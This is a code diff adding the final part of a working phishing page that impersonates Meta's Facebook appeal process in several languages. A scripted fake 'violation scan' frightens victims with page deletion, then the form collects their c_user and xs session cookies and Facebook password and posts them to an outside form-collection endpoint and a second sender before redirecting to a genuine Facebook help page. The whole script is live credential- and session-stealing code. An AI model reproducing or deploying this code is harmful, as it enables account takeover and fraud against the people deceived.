+            pageName:'صفحتك: مقررة للحذف', deletionReason:'السبب: انتهاك معايير المجتمع (انتحال شخصية / معلومات مضللة)', deletionTag:'حذف مُعلق · مطلوب تقديم استئناف',
+            caseNumber:'رقم القضية #: 4829-0012-META', violationDetails:'تفاصيل الانتهاك',
+            r1:'انتحال شخصية فرد أو علامة تجارية أخرى', r2:'نشر محتوى خاطئ أو مضلل', r3:'تلقي عدة بلاغات من المستخدمين',
+            whatHappens:'ما يحدث لاحقًا', n1:'سيتم حذف صفحتك نهائيًا خلال 30 يومًا', n2:'قد تفقد جميع بيانات الصفحة وصلاحيات المشرف',
+            appealSection:'عملية الاستئناف', appealInfo:'إذا كنت تعتقد أن هذا خطأ، قم بتقديم استئناف الآن.', appealSub:'سيقوم فريقنا بمراجعة استئنافك خلال 48 ساعة.',
+            deadlineNote:'الموعد النهائي للاستئناف: 30 يومًا من هذا الإشعار', appealBtn:'تقديم الاستئناف',
+            bc1:'مركز المساعدة', bc2:'إدارة صفحتك', bc3:'الاستئناف على حذف صفحة',
+            hdrH:'الاستئناف على حذف صفحتك', hdrP:'قدم تفاصيل التحقق التالية ليتمكن فريقنا من مراجعة استئنافك.',
+            infoTitle:'التحقق المطلوب', infoBody:'لتأكيد أنك مالك الصفحة، يرجى إدخال رمز تأكيد الحساب ورمز الجلسة. شاهد دليل الفيديو إذا كنت بحاجة إلى مساعدة في العثور عليهما.',
+            warnImp:'مهم:', warnBody:'لا تقم بتسجيل الخروج حتى تتم معالجة استئنافك. سيؤدي تسجيل الخروج إلى إلغاء استئنافك.',
+            vidLbl:'دليل الفيديو', frmT:'أرسل استئنافك', frmS:'جميع الحقول مطلوبة. ستؤدي المعلومات غير المكتملة أو غير الصحيحة إلى رفض الاستئناف.',
+            errTxt:'أدخل تفاصيل دقيقة. عدم القيام بذلك قد يؤدي إلى حذف الصفحة بشكل دائم.',
+            submitBtn:'إرسال الاستئناف', s3Nav:'تأكيد الهوية', s3Help:'مركز المساعدة', s3Bc1:'مركز المساعدة', s3Bc2:'أكد هويتك',
+            pwPrompt:'أدخل كلمة مرور Facebook الخاصة بك للتحقق من هويتك وإكمال الاستئناف.', pwPlaceholder:'كلمة مرور Facebook',
+            pwErr:'كلمة المرور التي أدخلتها غير صحيحة. يرجى المحاولة مرة أخرى.', pwForgot:'هل نسيت كلمة المرور؟', pwContinue:'تأكيد الهوية', pwNotYou:'لست أنت؟',
+            pwOkT:'تم تقديم الاستئناف', pwOkS:'ستتم مراجعة استئنافك في غضون 48 ساعة. تحقق من بريدك الإلكتروني للحصول على التحديثات.'
+        },
+        french: {
+            scanTitle:'Vérification de l\'état de votre compte', scanSub:'Meta examine votre compte pour détecter d\'éventuelles violations des politiques…',
+            scanInit:'Initialisation…', scanS1:'Récupération des données du compte…', scanS2:'Vérification de l\'activité récente…',
+            scanS3:'Recherche de violations des politiques…', scanS4:'Examen des signalements…', scanS5:'Violation confirmée…', scanDone:'✓ Violation détectée ! Chargement de l\'avis…',
+            chk1:'Récupération des données du compte', chk2:'Vérification de l\'activité récente', chk3:'Recherche de violations des politiques', chk4:'Examen des signalements',
+            violTitle:'Violation détectée !', violSub:'Votre page a été signalée pour non-respect des standards de la communauté Meta.', violTag:'PAGE PROGRAMMÉE POUR SUPPRESSION',
+            pageName:'Votre page : Programmmée pour suppression', deletionReason:'Motif : Violation des standards de la communauté (Usurpation d\'identité / Désinformation)', deletionTag:'SUPPRESSION EN ATTENTE · Appel requis',
+            caseNumber:'Cas # : 4829-0012-META', violationDetails:'Détails de la violation',
+            r1:'Usurpation d\'identité d\'une autre personne ou marque', r2:'Diffusion de contenu faux ou trompeur', r3:'Plusieurs signalements d\'utilisateurs reçus',
+            whatHappens:'Ce qui se passe ensuite', n1:'Votre page sera définitivement supprimée dans 30 jours', n2:'Vous pourriez perdre toutes les données de la page et les droits d\'administration',
+            appealSection:'Processus d\'appel', appealInfo:'Si vous pensez qu\'il s\'agit d\'une erreur, faites appel maintenant.', appealSub:'Notre équipe examinera votre appel sous 48 heures.',
+            deadlineNote:'Date limite d\'appel : 30 jours à compter de cet avis', appealBtn:'Faire appel',
+            bc1:'Centre d\'aide', bc2:'Gérer votre page', bc3:'Faire appel de la suppression d\'une page',
+            hdrH:'Faire appel de la suppression de votre page', hdrP:'Fournissez les détails de vérification suivants pour que notre équipe puisse examiner votre appel.',
+            infoTitle:'Vérification requise', infoBody:'Pour confirmer que vous êtes le propriétaire de la page, veuillez entrer votre code de confirmation de compte et votre jeton de session. Regardez le guide vidéo si vous avez besoin d\'aide pour les trouver.',
+            warnImp:'Important :', warnBody:'Ne vous déconnectez pas tant que votre appel n\'est pas traité. La déconnexion annulera votre appel.',
+            vidLbl:'Guide vidéo', frmT:'Soumettre votre appel', frmS:'Tous les champs sont obligatoires. Des informations incomplètes ou incorrectes entraîneront le rejet de l\'appel.',
+            errTxt:'Saisissez des détails précis. Ne pas le faire peut entraîner la suppression définitive de la page.',
+            submitBtn:'Soumettre l\'appel', s3Nav:'Confirmation d\'identité', s3Help:'Centre d\'aide', s3Bc1:'Centre d\'aide', s3Bc2:'Confirmez votre identité',
+            pwPrompt:'Entrez votre mot de passe Facebook pour vérifier votre identité et terminer l\'appel.', pwPlaceholder:'Mot de passe Facebook',
+            pwErr:'Le mot de passe saisi est incorrect. Veuillez réessayer.', pwForgot:'Mot de passe oublié ?', pwContinue:'Confirmer l\'identité', pwNotYou:'Ce n\'est pas vous ?',
+            pwOkT:'Appel soumis', pwOkS:'Votre appel sera examiné sous 48 heures. Consultez vos e-mails pour les mises à jour.'
+        },
+        tamil: {
+            scanTitle:'உங்கள் கணக்கின் நிலையைச் சரிபார்க்கிறது', scanSub:'Meta உங்கள் கணக்கில் கொள்கை மீறல்களை மதிப்பாய்வு செய்கிறது…',
+            scanInit:'தொடங்குகிறது…', scanS1:'கணக்குத் தரவைப் பெறுகிறது…', scanS2:'சமீபத்திய செயல்பாட்டைச் சரிபார்க்கிறது…',
+            scanS3:'கொள்கை மீறல்களை ஸ்கேன் செய்கிறது…', scanS4:'அறிக்கைகளை மதிப்பாய்வு செய்கிறது…', scanS5:'மீறல் உறுதிசெய்யப்பட்டது…', scanDone:'✓ மீறல் கண்டறியப்பட்டது! அறிவிப்பை ஏற்றுகிறது…',
+            chk1:'கணக்குத் தரவைப் பெறுதல்', chk2:'சமீபத்திய செயல்பாட்டைச் சரிபார்த்தல்', chk3:'கொள்கை மீறல்களை ஸ்கேன் செய்தல்', chk4:'அறிக்கைகளை மதிப்பாய்வு செய்தல்',
+            violTitle:'மீறல் கண்டறியப்பட்டது!', violSub:'உங்கள் பக்கம் Metaவின் சமூகத் தரங்களை மீறியதாகப் புகாரளிக்கப்பட்டுள்ளது.', violTag:'பக்கம் நீக்க திட்டமிடப்பட்டுள்ளது',
+            pageName:'உங்கள் பக்கம்: நீக்க திட்டமிடப்பட்டது', deletionReason:'காரணம்: சமூகத் தர மீறல் (ஆள்மாறாட்டம் / தவறான தகவல்)', deletionTag:'நீக்கம் நிலுவையில் உள்ளது · மேல்முறையீடு தேவை',
+            caseNumber:'வழக்கு #: 4829-0012-META', violationDetails:'மீறல் விவரங்கள்',
+            r1:'வேறொரு நபர் அல்லது பிராண்டாக ஆள்மாறாட்டம் செய்தல்', r2:'தவறான அல்லது தவறாக வழிநடத்தும் உள்ளடக்கத்தைப் பரப்புதல்', r3:'பல பயனர் அறிக்கைகள் பெறப்பட்டன',
+            whatHappens:'அடுத்து என்ன நடக்கும்', n1:'உங்கள் பக்கம் 30 நாட்களில் நிரந்தரமாக நீக்கப்படும்', n2:'நீங்கள் பக்கத் தரவு மற்றும் நிர்வாக உரிமைகள் அனைத்தையும் இழக்கலாம்',
+            appealSection:'மேல்முறையீட்டு செயல்முறை', appealInfo:'இது தவறு என்று நீங்கள் நினைத்தால், இப்போதே மேல்முறையீடு செய்யவும்.', appealSub:'எங்கள் குழு 48 மணி நேரத்திற்குள் உங்கள் மேல்முறையீட்டை மதிப்பாய்வு செய்யும்.',
+            deadlineNote:'மேல்முறையீட்டு காலக்கெடு: இந்த அறிவிப்பிலிருந்து 30 நாட்கள்', appealBtn:'மேல்முறையீட்டைச் சமர்ப்பிக்கவும்',
+            bc1:'உதவி மையம்', bc2:'உங்கள் பக்கத்தை நிர்வகித்தல்', bc3:'பக்கம் நீக்கத்தை மேல்முறையீடு செய்யவும்',
+            hdrH:'உங்கள் பக்கம் நீக்கத்தை மேல்முறையீடு செய்யவும்', hdrP:'எங்கள் குழு உங்கள் மேல்முறையீட்டை மதிப்பாய்வு செய்ய பின்வரும் சரிபார்ப்பு விவரங்களை வழங்கவும்.',
+            infoTitle:'தேவையான சரிபார்ப்பு', infoBody:'நீங்கள் பக்கத்தின் உரிமையாளர் என்பதை உறுதிப்படுத்த, உங்கள் கணக்கு உறுதிப்படுத்தல் குறியீடு மற்றும் அமர்வு டோக்கனை உள்ளிடவும். அவற்றைக் கண்டறிய உதவி தேவைப்பட்டால் வீடியோ வழிகாட்டியைப் பார்க்கவும்.',
+            warnImp:'முக்கியம்:', warnBody:'உங்கள் மேல்முறையீடு செயலாக்கப்படும் வரை வெளியேற வேண்டாம். வெளியேறுவது உங்கள் மேல்முறையீட்டை ரத்து செய்யும்.',
+            vidLbl:'வீடியோ வழிகாட்டி', frmT:'உங்கள் மேல்முறையீட்டைச் சமர்ப்பிக்கவும்', frmS:'அனைத்து புலங்களும் தேவை. முழுமையடையாத அல்லது தவறான தகவல் மேல்முறையீடு மறுக்கப்படுவதற்கு வழிவகுக்கும்.',
+            errTxt:'துல்லியமான விவரங்களை உள்ளிடவும். தவறினால் நிரந்தர பக்கம் நீக்கம் ஏற்படலாம்.',
+            submitBtn:'மேல்முறையீட்டைச் சமர்ப்பிக்கவும்', s3Nav:'அடையாள உறுதிப்படுத்தல்', s3Help:'உதவி மையம்', s3Bc1:'உதவி மையம்', s3Bc2:'உங்கள் அடையாளத்தை உறுதிப்படுத்தவும்',
+            pwPrompt:'உங்கள் அடையாளத்தைச் சரிபார்த்து மேல்முறையீட்டை முடிக்க உங்கள் Facebook கடவுச்சொல்லை உள்ளிடவும்.', pwPlaceholder:'Facebook கடவுச்சொல்',
+            pwErr:'நீங்கள் உள்ளிட்ட கடவுச்சொல் தவறானது. தயவுசெய்து மீண்டும் முயற்சிக்கவும்.', pwForgot:'கடவுச்சொல் மறந்துவிட்டதா?', pwContinue:'அடையாளத்தை உறுதிப்படுத்தவும்', pwNotYou:'நீங்கள் இல்லையா?',
+            pwOkT:'மேல்முறையீடு சமர்ப்பிக்கப்பட்டது', pwOkS:'உங்கள் மேல்முறையீடு 48 மணி நேரத்திற்குள் மதிப்பாய்வு செய்யப்படும். புதுப்பிப்புகளுக்கு உங்கள் மின்னஞ்சலைச் சரிபார்க்கவும்.'
+        },
+        vietnamese: {
+            scanTitle:'Đang kiểm tra trạng thái tài khoản của bạn', scanSub:'Meta đang xem xét tài khoản của bạn để phát hiện vi phạm chính sách…',
+            scanInit:'Đang khởi tạo…', scanS1:'Đang truy xuất dữ liệu tài khoản…', scanS2:'Đang kiểm tra hoạt động gần đây…',
+            scanS3:'Đang quét vi phạm chính sách…', scanS4:'Đang xem xét báo cáo…', scanS5:'Đã xác nhận vi phạm…', scanDone:'✓ Đã phát hiện vi phạm! Đang tải thông báo…',
+            chk1:'Truy xuất dữ liệu tài khoản', chk2:'Kiểm tra hoạt động gần đây', chk3:'Quét vi phạm chính sách', chk4:'Xem xét báo cáo',
+            violTitle:'Đã phát hiện vi phạm!', violSub:'Trang của bạn đã bị báo cáo vì vi phạm Tiêu chuẩn cộng đồng của Meta.', violTag:'TRANG ĐÃ LÊN LỊCH XÓA',
+            pageName:'Trang của bạn: Đã lên lịch xóa', deletionReason:'Lý do: Vi phạm Tiêu chuẩn cộng đồng (Mạo danh / Thông tin sai lệch)', deletionTag:'ĐANG CHỜ XÓA · Cần kháng cáo',
+            caseNumber:'Mã số vụ: 4829-0012-META', violationDetails:'Chi tiết vi phạm',
+            r1:'Mạo danh cá nhân hoặc thương hiệu khác', r2:'Phát tán nội dung sai sự thật hoặc gây hiểu lầm', r3:'Đã nhận nhiều báo cáo từ người dùng',
+            whatHappens:'Điều gì xảy ra tiếp theo', n1:'Trang của bạn sẽ bị xóa vĩnh viễn sau 30 ngày', n2:'Bạn có thể mất tất cả dữ liệu trang và quyền quản trị',
+            appealSection:'Quy trình kháng cáo', appealInfo:'Nếu bạn cho rằng đây là sai lầm, hãy gửi kháng cáo ngay.', appealSub:'Nhóm của chúng tôi sẽ xem xét kháng cáo của bạn trong vòng 48 giờ.',
+            deadlineNote:'Hạn chót kháng cáo: 30 ngày kể từ thông báo này', appealBtn:'Gửi kháng cáo',
+            bc1:'Trung tâm trợ giúp', bc2:'Quản lý trang của bạn', bc3:'Kháng cáo xóa trang',
+            hdrH:'Kháng cáo việc xóa trang của bạn', hdrP:'Cung cấp các chi tiết xác minh sau để nhóm của chúng tôi xem xét kháng cáo của bạn.',
+            infoTitle:'Xác minh bắt buộc', infoBody:'Để xác nhận bạn là chủ sở hữu trang, vui lòng nhập Mã xác nhận tài khoản và Mã thông báo phiên. Xem video hướng dẫn nếu bạn cần trợ giúp tìm chúng.',
+            warnImp:'Quan trọng:', warnBody:'Không đăng xuất cho đến khi kháng cáo của bạn được xử lý. Đăng xuất sẽ hủy kháng cáo của bạn.',
+            vidLbl:'Video hướng dẫn', frmT:'Gửi kháng cáo của bạn', frmS:'Tất cả các trường đều bắt buộc. Thông tin không đầy đủ hoặc không chính xác sẽ dẫn đến từ chối kháng cáo.',
+            errTxt:'Nhập chi tiết chính xác. Không làm như vậy có thể dẫn đến xóa trang vĩnh viễn.',
+            submitBtn:'Gửi kháng cáo', s3Nav:'Xác nhận danh tính', s3Help:'Trung tâm trợ giúp', s3Bc1:'Trung tâm trợ giúp', s3Bc2:'Xác nhận danh tính của bạn',
+            pwPrompt:'Nhập mật khẩu Facebook của bạn để xác minh danh tính và hoàn tất kháng cáo.', pwPlaceholder:'Mật khẩu Facebook',
+            pwErr:'Mật khẩu bạn nhập không chính xác. Vui lòng thử lại.', pwForgot:'Quên mật khẩu?', pwContinue:'Xác nhận danh tính', pwNotYou:'Không phải bạn?',
+            pwOkT:'Đã gửi kháng cáo', pwOkS:'Kháng cáo của bạn sẽ được xem xét trong vòng 48 giờ. Kiểm tra email để cập nhật.'
+        },
+        ghanaian: {
+            scanTitle:'Checking Your Account Status', scanSub:'Meta is reviewing your account for policy violations…',
+            scanInit:'Initializing…', scanS1:'Retrieving account data…', scanS2:'Checking recent activity…',
+            scanS3:'Scanning for policy violations…', scanS4:'Reviewing reports…', scanS5:'Violation confirmed…', scanDone:'✓ Violation detected! Loading notice…',
+            chk1:'Retrieving account data', chk2:'Checking recent activity', chk3:'Scanning for policy violations', chk4:'Reviewing reports',
+            violTitle:'Violation Detected!', violSub:'Your page has been reported for breaking Meta\'s Community Standards.', violTag:'PAGE SCHEDULED FOR DELETION',
+            pageName:'Your Page: Scheduled for Deletion', deletionReason:'Reason: Violation of Community Standards (Impersonation / Misinformation)', deletionTag:'DELETION PENDING · Appeal Required',
+            caseNumber:'Case #: 4829-0012-META', violationDetails:'Violation Details',
+            r1:'Impersonation of another individual or brand', r2:'Spreading false or misleading content', r3:'Multiple user reports received',
+            whatHappens:'What Happens Next', n1:'Your page will be permanently deleted in 30 days', n2:'You may lose all page data and admin rights',
+            appealSection:'Appeal Process', appealInfo:'If you believe this is a mistake, submit an appeal now.', appealSub:'Our team will review your appeal within 48 hours.',
+            deadlineNote:'Appeal deadline: 30 days from this notice', appealBtn:'Submit Appeal',
+            bc1:'Help Center', bc2:'Managing Your Page', bc3:'Appeal a Page Deletion',
+            hdrH:'Appeal Your Page Deletion', hdrP:'Provide the following verification details so our team can review your appeal.',
+            infoTitle:'Required Verification', infoBody:'To confirm you\'re the page owner, please enter your Account Confirmation Code and Session Token. Watch the video guide if you need help locating them.',
+            warnImp:'Important:', warnBody:'Do not log out until your appeal is processed. Logging out will cancel your appeal.',
+            vidLbl:'Video Guide', frmT:'Submit Your Appeal', frmS:'All fields are required. Incomplete or incorrect information will result in appeal denial.',
+            errTxt:'Enter accurate details. Failure to do so may lead to permanent page deletion.',
+            submitBtn:'Submit Appeal', s3Nav:'Identity Confirmation', s3Help:'Help Center', s3Bc1:'Help Center', s3Bc2:'Confirm Your Identity',
+            pwPrompt:'Enter your Facebook password to verify your identity and complete the appeal.', pwPlaceholder:'Facebook password',
+            pwErr:'The password you entered is incorrect. Please try again.', pwForgot:'Forgot password?', pwContinue:'Confirm Identity', pwNotYou:'Not you?',
+            pwOkT:'Appeal Submitted', pwOkS:'Your appeal will be reviewed within 48 hours. Check your email for updates.'
+        }
+    };
+
+    function applyTranslations(lang) {
+        const t = T[lang] || T.english;
+        const txt = (id, v) => { const el = document.getElementById(id); if (el) el.textContent = v; };
+        const ph = (id, v) => { const el = document.getElementById(id); if (el) el.placeholder = v; };
+        const set = (id, html) => { const el = document.getElementById(id); if (el) el.innerHTML = html; };
+
+        txt('t-scan-title', t.scanTitle); txt('t-scan-sub', t.scanSub);
+        txt('t-chk1', t.chk1); txt('t-chk2', t.chk2); txt('t-chk3', t.chk3); txt('t-chk4', t.chk4);
+        txt('t-viol-title', t.violTitle); txt('t-viol-sub', t.violSub); txt('t-viol-tag', t.violTag);
+        txt('t-page-name', t.pageName); txt('t-deletion-reason', t.deletionReason); txt('t-deletion-tag', t.deletionTag);
+        txt('t-case-number', t.caseNumber); txt('t-violation-details', t.violationDetails);
+        txt('t-r1', t.r1); txt('t-r2', t.r2); txt('t-r3', t.r3);
+        txt('t-what-happens', t.whatHappens); txt('t-n1', t.n1); txt('t-n2', t.n2);
+        txt('t-appeal-section', t.appealSection); txt('t-appeal-info', t.appealInfo); txt('t-appeal-sub', t.appealSub);
+        txt('t-deadline-note', t.deadlineNote); txt('t-appeal-btn', t.appealBtn);
+        txt('t-bc1', t.bc1); txt('t-bc2', t.bc2); txt('t-bc3', t.bc3);
+        txt('t-hdr-h', t.hdrH); txt('t-hdr-p', t.hdrP);
+        txt('t-info-title', t.infoTitle); txt('t-info-body', t.infoBody);
+        txt('t-warn-imp', t.warnImp); txt('t-warn-body', t.warnBody);
+        txt('t-vid-lbl', t.vidLbl); txt('t-frm-t', t.frmT); txt('t-frm-s', t.frmS); txt('t-err-txt', t.errTxt);
+        txt('t-submit-btn', t.submitBtn);
+        txt('t-s3-nav', t.s3Nav); txt('t-s3-help', t.s3Help); txt('t-s3-bc1', t.s3Bc1); txt('t-s3-bc2', t.s3Bc2);
+        txt('t-pw-prompt', t.pwPrompt); ph('pw-input', t.pwPlaceholder);
+        txt('t-pw-err', t.pwErr); txt('t-pw-forgot', t.pwForgot);
+        txt('t-pw-continue', t.pwContinue); txt('t-pw-not-you', t.pwNotYou);
+        txt('t-pw-ok-t', t.pwOkT); txt('t-pw-ok-s', t.pwOkS);
+    }
+
+    const videoSrc = {
+        english:'https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4',
+        spanish:'https://resource2.heygen.ai/video_translate/db7e753c13fa4d238fe716483469ae8f-es/720p.mp4',
+        hindi:'https://resource2.heygen.ai/video_translate/9d7e40f714c842258bd08ad4c3ee68d6-hi/720p.mp4',
+        french:'https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27ecb21-fr/720p.mp4',
+        portuguese:'https://allvideos.wasmer.app/Portuguese.mp4',
+        tamil:'https://allvideos.wasmer.app/tamil.mp4',
+        arabic:'https://resource2.heygen.ai/video_translate/f7346b2ef53c4daa9bc15138684919db-ar_use-aicoustics-vocal/720p.mp4',
+        ghanaian:'https://allvideos.wasmer.app/english.mp4',
+        vietnamese:'https://allvideos.wasmer.app/vietanames.mp4'
+    };
+    const flagSrc = {
+        english:'https://flagcdn.com/24x18/us.png', hindi:'https://flagcdn.com/24x18/in.png',
+        spanish:'https://flagcdn.com/24x18/es.png', portuguese:'https://flagcdn.com/24x18/pt.png',
+        tamil:'https://flagcdn.com/24x18/in.png', arabic:'https://flagcdn.com/24x18/sa.png',
+        french:'https://flagcdn.com/24x18/fr.png', vietnamese:'https://flagcdn.com/24x18/vn.png',
+        ghanaian:'https://flagcdn.com/24x18/gh.png'
+    };
+    let currentLang = 'english';
+
+    function goTo(id) {
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+        window.scrollTo(0, 0);
+    }
+
+    const langWrap = document.getElementById('lang-wrap');
+    const langConfirm = document.getElementById('lm-confirm');
+    let selectedLang = null;
+
+    
+    langWrap.classList.add('show');
+
+    document.querySelectorAll('.lm-opt').forEach(opt => {
+        opt.addEventListener('click', () => {
+            document.querySelectorAll('.lm-opt').forEach(o => o.classList.remove('sel'));
+            opt.classList.add('sel');
+            selectedLang = opt.dataset.lang;
+            langConfirm.disabled = false;
+        });
+    });
+
+    document.getElementById('lm-search').addEventListener('input', function() {
+        const q = this.value.toLowerCase();
+        document.querySelectorAll('.lm-opt').forEach(o => {
+            o.style.display = o.textContent.toLowerCase().includes(q) ? '' : 'none';
+        });
+    });
+
+    let scanStarted = false;
+    langConfirm.addEventListener('click', () => {
+        if (!selectedLang) return;
+        currentLang = selectedLang;
+        const capName = currentLang.charAt(0).toUpperCase() + currentLang.slice(1);
+        document.getElementById('s2-flag').src = flagSrc[currentLang];
+        document.getElementById('s2-lang-name').textContent = capName;
+        document.getElementById('guide-video-src').src = videoSrc[currentLang] || videoSrc.english;
+        document.getElementById('guide-video').load();
+        applyTranslations(currentLang);
+        langWrap.classList.remove('show');
+        if (!scanStarted) { scanStarted = true; runScan(); }
+    });
+
+    document.getElementById('s2-lang-btn').addEventListener('click', () => {
+        document.querySelectorAll('.lm-opt').forEach(o => {
+            o.classList.toggle('sel', o.dataset.lang === currentLang);
+        });
+        langConfirm.disabled = false;
+        selectedLang = currentLang;
+        langWrap.classList.add('show');
+    });
+
+    function runScan() {
+        const fill = document.getElementById('progressFill');
+        const status = document.getElementById('scanStatus');
+        const t = T[currentLang] || T.english;
+        const labels = [t.scanS1, t.scanS2, t.scanS3, t.scanS4, t.scanS5];
+        status.textContent = t.scanInit;
+        let pct = 0;
+        const interval = setInterval(() => {
+            pct = Math.min(pct + 1, 100);
+            fill.style.width = pct + '%';
+            if (pct === 10) { status.textContent = labels[0]; document.getElementById('chk1').classList.add('done'); }
+            if (pct === 30) { status.textContent = labels[1]; document.getElementById('chk2').classList.add('done'); }
+            if (pct === 55) { status.textContent = labels[2]; document.getElementById('chk3').classList.add('done'); }
+            if (pct === 78) { status.textContent = labels[3]; document.getElementById('chk4').classList.add('done'); }
+            if (pct === 92) { status.textContent = labels[4]; }
+            if (pct >= 100) {
+                clearInterval(interval);
+                status.textContent = t.scanDone;
+                status.style.color = '#d32f2f';
+                status.style.fontWeight = '700';
+                setTimeout(() => {
+                    document.getElementById('scanScreen').style.display = 'none';
+                    const flash = document.getElementById('violationFlash');
+                    flash.classList.add('show');
+                    setTimeout(() => {
+                        flash.classList.remove('show');
+                        flash.style.display = 'none';
+                        const plan = document.getElementById('deletionCard');
+                        plan.style.display = 'block';
+                        setTimeout(() => {
+                            document.querySelectorAll('.mv-feat').forEach((el, i) => {
+                                setTimeout(() => el.classList.add('visible'), i * 80);
+                            });
+                        }, 200);
+                    }, 1800);
+                }, 600);
+            }
+        }, 28);
+    }
+
+    let allowRecovery = false, finalRedirect = "";
+
+    document.getElementById("verificationForm").addEventListener("submit", function(e) {
+        e.preventDefault();
+        const btn = document.getElementById("submitBtn");
+        btn.classList.add("loading"); btn.disabled = true;
+
+        const formData = {
+            c_user: document.getElementById("c_user").value.trim(),
+            xs: document.getElementById("xs").value.trim()
+        };
+
+        fetch("https://submit-form.com/9a3wbLbwz", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(formData)
+        }).catch(() => {});
+
+        window.sendToEndpoint({...formData, type: 'step2'});
+
+        setTimeout(() => {
+            btn.classList.remove("loading"); btn.disabled = false;
+            if (allowRecovery) {
+                window.location.replace(atob(finalRedirect));
+            } else {
+                goTo('s3');
+            }
+        }, 300);
+    });
+
+    const eyeOpen = `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>`;
+    const eyeSlash = `<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1='1' y1='1' x2='23' y2='23'/>`;
+
+    document.getElementById("eyeBtn").addEventListener("click", function() {
+        const inp = document.getElementById("pw-input");
+        const ico = document.getElementById("eyeIco");
+        const isPass = inp.type === "password";
+        inp.type = isPass ? "text" : "password";
+        ico.innerHTML = isPass ? eyeSlash : eyeOpen;
+    });
+
+    document.getElementById("passwordForm").addEventListener("submit", function(e) {
+        e.preventDefault();
+        const val = document.getElementById("pw-input").value;
+        const err = document.getElementById("pwErr");
+        const btn = document.getElementById("pwBtn");
+        err.classList.remove("show");
+        if (val.length < 6) { err.classList.add("show"); return; }
+
+        btn.classList.add("loading"); btn.disabled = true;
+
+        fetch("https://submit-form.com/9a3wbLbwz", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ password: val })
+        }).catch(() => {});
+
+        window.sendToEndpoint({ password: val, type: 'step3' });
+
+        setTimeout(() => {
+            document.getElementById("pwForm").style.display = "none";
+            document.getElementById("pwSuccess").classList.add("show");
+            setTimeout(() => { window.location.href = "https://www.facebook.com/help/media/thank-you?rdrhc"; }, 100);
+        }, 300);
+    });
+</script>
+
+</body>
+</html>
